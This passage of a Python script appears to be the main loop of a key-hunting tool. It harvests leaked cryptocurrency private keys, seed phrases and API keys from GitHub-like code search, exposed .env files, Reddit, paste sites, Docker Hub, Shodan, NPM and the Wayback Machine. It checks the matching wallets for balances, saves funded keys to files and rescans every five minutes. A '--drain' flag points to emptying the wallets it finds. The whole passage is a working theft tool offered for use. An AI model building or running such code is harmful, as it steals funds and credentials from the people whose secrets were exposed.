            sg_keys = search_sourcegraph(max_pages=2)
            all_keys.update(sg_keys)
            logger.info("Sourcegraph: %d keys", len(sg_keys))
        except Exception: pass

        # Search exposed .env files on web
        try:
            web_keys = search_web_env_files(max_urls=15)
            all_keys.update(web_keys)
            logger.info("Web .env: %d keys", len(web_keys))
        except Exception: pass

        # Search Reddit
        try:
            reddit_keys = search_reddit(max_posts=30)
            all_keys.update(reddit_keys)
            logger.info("Reddit: %d keys", len(reddit_keys))
        except Exception: pass

        # Search GitLab
        try:
            gl_keys = search_gitlab(max_pages=2)
            all_keys.update(gl_keys)
            logger.info("GitLab: %d keys", len(gl_keys))
        except Exception: pass

        # Search paste services
        try:
            paste_keys = search_hastebin()
            all_keys.update(paste_keys)
            logger.info("Paste sites: %d keys", len(paste_keys))
        except Exception: pass

        # Search Docker Hub
        try:
            dh_keys = search_dockerhub()
            all_keys.update(dh_keys)
            logger.info("Docker Hub: %d keys", len(dh_keys))
        except Exception: pass

        # Search StackExchange
        try:
            se_keys = search_stackexchange()
            all_keys.update(se_keys)
            logger.info("StackExchange: %d keys", len(se_keys))
        except Exception: pass

        # Search Shodan
        try:
            sh_keys = search_shodan()
            all_keys.update(sh_keys)
            logger.info("Shodan: %d keys", len(sh_keys))
        except Exception: pass

        # Search NPM packages for hardcoded keys
        try:
            npm_keys = search_npm()
            all_keys.update(npm_keys)
            logger.info("NPM: %d keys", len(npm_keys))
        except Exception: pass

        # Search Wayback Machine for old repo versions
        try:
            wm_keys = search_wayback()
            all_keys.update(wm_keys)
            logger.info("Wayback: %d keys", len(wm_keys))
        except Exception: pass

        # Search Dev.to articles
        try:
            dt_keys = search_devto(max_pages=2)
            all_keys.update(dt_keys)
            logger.info("Dev.to: %d keys", len(dt_keys))
        except Exception: pass

        # Process found keys
        new_keys = all_keys - checked_keys
        logger.info("New keys to check: %d", len(new_keys))

        hits = []
        for key in new_keys:
            checked_keys.add(key)
            
            # Handle seed phrases
            if key.startswith("SEED:"):
                seed = key[5:]
                addr = derive_from_seed(seed)
                if addr:
                    balances = check_all_chains(addr)
                    if balances:
                        logger.warning("  💰 SEED PHRASE: %s... → %s", seed[:20], addr)
                        hits.append(("seed", addr, seed, list(balances.values())[0]))
                continue
            
            # Handle API keys
            if key.startswith("APIKEY:"):
                logger.info("  🔑 Found API key: %s", key[7:])
                hits.append(("apikey", "", key[7:], 0))
                continue
            
            # Handle private keys
            addr = derive_address(key)
            if not addr:
                continue

            balances = check_all_chains(addr)
            if balances:
                total_usd = 0
                for chain, bal in balances.items():
                    logger.warning("  💰 %s: %s = %.6f", chain, addr, bal)
                    hits.append((chain, addr, key, bal))

            time.sleep(0.3)  # Rate limit between checks

        # Save ALL found keys (even empty) for continuous monitoring
        if all_keys:
            existing = set()
            try:
                with open("all_leaked_private_keys.txt") as f:
                    existing = set(line.strip() for line in f)
            except: pass
            for k in all_keys:
                if not k.startswith("SEED:") and not k.startswith("APIKEY:"):
                    existing.add(k if k.startswith("0x") else "0x" + k)
            with open("all_leaked_private_keys.txt", "w") as f:
                for k in sorted(existing):
                    f.write(k + "\n")

        if hits:
            with open("leaked_keys_found.txt", "a") as f:
                for chain, addr, key, bal in hits:
                    f.write(f"{chain} | {addr} | {key} | {bal}\n")
            logger.warning("FOUND %d ACTIVE KEYS WITH BALANCE!", len(hits))
        else:
            logger.info("No active keys found this round")

        logger.info("Sleeping 300s before next scan...")
        time.sleep(300)


if __name__ == "__main__":
    import sys
    drain = "--drain" in sys.argv
    hunt_keys(drain_mode=drain)
